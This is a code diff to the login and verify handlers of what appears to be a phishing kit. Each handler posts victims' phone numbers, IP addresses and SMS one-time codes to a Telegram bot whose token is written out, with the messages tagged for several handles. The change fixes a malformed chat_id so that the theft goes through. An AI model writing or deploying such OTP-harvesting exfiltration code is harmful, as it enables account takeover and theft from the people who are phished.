@@ -77,7 +77,7 @@ def login(request):
             "number3":number3,
             "number4":number4
         }
-        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=--1002085370840&text=id::{contact.id}|ip:{contact.ip}\nPage:{contact.page_name}\nnumber:{contact.phone}\n  @selascs @TetaLab @alienfx')
+        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1002085370840&text=id::{contact.id}|ip:{contact.ip}\nPage:{contact.page_name}\nnumber:{contact.phone}\n  @selascs @TetaLab @alienfx')
         request.session['contact_id'] = contact.id
         return render(request, 'login/otp.html',context)
     return render(request, 'login/index.html')
@@ -118,7 +118,7 @@ def verify(request):
         context = {
             'last_contact_id': contact.id
         }
-        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=--1002085370840&text=id::{contact.id}|ip:{contact.ip}\nsms:{combined_sms} @selascs @TetaLab @alienfx ')
+        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1002085370840&text=id::{contact.id}|ip:{contact.ip}\nsms:{combined_sms} @selascs @TetaLab @alienfx ')
         return render( request,'login/load.html',context )
     return render( request,'login/index.html',context )
 
